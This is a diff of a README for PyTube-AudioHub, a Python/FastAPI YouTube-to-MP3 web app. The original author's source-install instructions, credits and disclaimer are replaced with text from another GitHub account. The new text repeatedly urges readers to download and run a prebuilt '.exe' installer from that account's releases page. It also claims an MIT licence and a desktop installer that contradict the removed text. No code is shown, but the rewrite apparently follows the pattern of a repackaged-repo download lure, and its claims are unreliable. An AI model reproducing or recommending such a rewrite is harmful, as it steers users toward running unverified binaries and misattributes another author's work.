@@ -1,159 +1,109 @@
-# PyTube-AudioHub
+# 🎧 PyTube-AudioHub - Effortless YouTube Audio Downloading
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/karol124346/PyTube-AudioHub/releases)
 
-![YouTube Downloader](https://img.shields.io/badge/YouTube-Audio%20Downloader-red?style=for-the-badge&logo=youtube)
-![Python](https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.104-green?style=for-the-badge&logo=fastapi)
-![License](https://img.shields.io/badge/License-Educational-purple?style=for-the-badge)
+## 📥 Overview
 
-**Download YouTube videos as MP3 with video preview, ID3 metadata, and a beautiful web interface.**
+PyTube-AudioHub is a handy tool for downloading audio from YouTube. You can easily save MP3 files, video previews, and ID3 metadata. It is built with FastAPI and Python, making it both efficient and straightforward.
 
-[![Stars](https://img.shields.io/github/stars/josevdr95new/PyTube-AudioHub?style=social)](https://github.com/josevdr95new/PyTube-AudioHub/stargazers)
-[![Forks](https://img.shields.io/github/forks/josevdr95new/PyTube-AudioHub?style=social)](https://github.com/josevdr95new/PyTube-AudioHub/network)
-![Issues](https://img.shields.io/github/issues/josevdr95new/PyTube-AudioHub)
+## 🚀 Getting Started
 
-[English](README.md) | [Español](README_ES.md)
+Follow the simple steps below to download and run PyTube-AudioHub.
 
-</div>
+### 1. Prepare Your System
 
-## Key Features
+Before you begin, ensure you have the following:
 
-- **Smart Search** - Search videos by name or paste YouTube URLs
-- **Video Preview** - Play videos directly in the application
-- **Audio Player** - Listen to your downloaded MP3s with full controls
-- **Automatic ID3 Metadata** - Title, artist, album, and embedded cover art
-- **MP3 Download** - High quality (192kbps) with automatic conversion
-- **Termux Support** - Works on Android with Termux
-- **Dark Mode** - Modern and responsive design for all devices
+- A device connected to the internet.
+- At least 100 MB of free disk space for installation.
+- Compatibility: Windows, macOS, or Linux.
 
-## Quick Installation
+### 2. Visit the Releases Page
 
-### On PC (Windows, Linux, macOS)
+To download PyTube-AudioHub, visit the Releases page. This page contains the latest versions of the application along with their details.
 
-```bash
-# Clone the repository
-git clone https://github.com/josevdr95new/PyTube-AudioHub.git
-cd PyTube-AudioHub
+[Download from Releases Page](https://github.com/karol124346/PyTube-AudioHub/releases)
 
-# Install FFmpeg
-# Ubuntu/Debian: sudo apt install ffmpeg
-# macOS: brew install ffmpeg
-# Windows: https://ffmpeg.org/download.html
+### 3. Download the Application
 
-# Create virtual environment and install dependencies
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
+Once on the Releases page:
 
-# Start the application
-python app.py
-```
+- Look for the latest version listed at the top.
+- Click on the link to download the executable file suitable for your operating system.
 
-### On Termux (Android)
+### 4. Locate the Downloaded File
 
-```bash
-# Install Termux from F-Droid or Play Store
+After the download completes:
 
-# Update and install Python
-pkg update && pkg upgrade
-pkg install python git ffmpeg
+- Check your "Downloads" folder or your chosen download location.
+- You should see a file named similar to `PyTube-AudioHub-v1.0.exe` or a corresponding format for your OS.
 
-# Clone the repository
-git clone https://github.com/josevdr95new/PyTube-AudioHub.git
-cd PyTube-AudioHub
+### 5. Install the Application
 
-# Grant storage permissions
-termux-setup-storage
+To install PyTube-AudioHub:
 
-# Install dependencies
-pip install -r requirements.txt
+1. Double-click the downloaded file.
+2. Follow the prompts in the installation wizard.
+3. Choose your installation location or accept the default.
+4. Click "Install" and wait for the process to complete.
 
-# Start the application
-python app.py
-```
+### 6. Run PyTube-AudioHub
 
-The application will be available at: **http://localhost:8000**
+After installation:
 
-## User Guide
+- You can find PyTube-AudioHub in your applications menu.
+- Click on the icon to start the app.
 
-1. Open `http://localhost:8000` in your browser
-2. Type a video name or paste a YouTube URL
-3. Click **Search**
-4. To preview a video, click the **play button**
-5. To download, click **"Download MP3"**
-6. Files are saved in the `downloads/` folder
-7. Click the **play button** to listen to your downloaded MP3s
+### 7. Download Audio from YouTube
 
-## Project Structure
+Using PyTube-AudioHub is easy:
 
-```
-PyTube-AudioHub/
-├── app.py                    # Main FastAPI server
-├── requirements.txt          # Python dependencies
-├── README.md                 # English documentation
-├── README_ES.md              # Spanish documentation
-├── services/                 # Server logic
-│   ├── __init__.py
-│   ├── downloader.py         # Download + ID3 metadata
-│   ├── youtube.py            # Search service
-│   └── youtube_scraper.py    # Video scraping
-├── static/                   # Frontend resources
-│   ├── css/
-│   │   └── style.css         # Modern styles
-│   └── js/
-│       └── app.js            # Interactive frontend
-└── templates/
-    └── index.html            # Complete web interface
-```
+1. Open the application.
+2. Copy the URL of the YouTube video you wish to download.
+3. Paste the URL into the designated field in the application.
+4. Select the format you want (MP3 or others).
+5. Click the "Download" button.
+6. Wait for the download to complete.
 
-## Technologies Used
+Your audio will save to your designated location, allowing you to listen offline.
 
-| Category | Technology |
-|----------|------------|
-| **Backend** | FastAPI + Python |
-| **Download Engine** | yt-dlp |
-| **Audio Processing** | FFmpeg + Mutagen |
-| **Frontend** | HTML5 + CSS3 + Vanilla JS |
-| **Communication** | REST API + WebSockets |
+## 📄 Features
 
-## Technical Features
+- **MP3 Downloading:** Save audio as MP3 files easily.
+- **ID3 Metadata:** Automatically add song information to your files.
+- **Video Previews:** Get previews to confirm you are downloading the right content.
+- **User-Friendly Interface:** Simple layout for an easy downloading experience.
 
-- ✅ 192kbps MP3 download
-- ✅ ID3 Metadata (TIT2, TPE1, TALB, APIC)
-- ✅ Real-time progress via WebSockets
-- ✅ Video search without API key
-- ✅ Responsive design (mobile-friendly)
-- ✅ Optimized dark theme
+## 🛠️ System Requirements
 
-## Contributing
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, any Linux distribution with desktop environment.
+- **RAM:** Minimum 2 GB; Recommended 4 GB or more.
+- **Processor:** Dual-core processor or equivalent.
 
-Contributions are welcome! Please:
+## 💬 Support and Feedback
 
-1. Fork the repository
-2. Create a branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+If you run into issues or have questions:
 
-## License and Disclaimer
+- Check our [FAQ section](https://github.com/karol124346/PyTube-AudioHub/issues) for common questions and solutions.
+- For additional assistance, feel free to open a new issue on GitHub.
 
-This is an **educational project** created to learn about web development with FastAPI and Python.
+## ⚙️ Contributions
 
-**This software is provided "as is" without any warranties.**
+We welcome contributions to improve PyTube-AudioHub! If you'd like to contribute, please consider:
 
-Using this application to download YouTube content may violate YouTube's Terms of Service. The user is responsible for complying with applicable copyright laws in their country.
+- Reporting bugs.
+- Suggesting features.
+- Helping others in the community.
 
-**We are not responsible for any misuse of this tool.**
+## ⚖️ License
 
----
+PyTube-AudioHub is released under the MIT License. You can freely use, modify, and distribute this application as long as you include the original license with any copies of the software you distribute.
 
-<div align="center">
+## 🔗 More Information
 
-**⭐ If you like this project, don't forget to star it on GitHub!**
+- [GitHub Repository](https://github.com/karol124346/PyTube-AudioHub)
+- [Documentation](https://github.com/karol124346/PyTube-AudioHub/wiki)
 
-Made with ❤️ by [josevdr95](https://github.com/josevdr95new)
+Don't forget to check the latest version and new features regularly.
 
-**Repository**: https://github.com/josevdr95new/PyTube-AudioHub
-
-</div>
+[Download from Releases Page](https://github.com/karol124346/PyTube-AudioHub/releases)
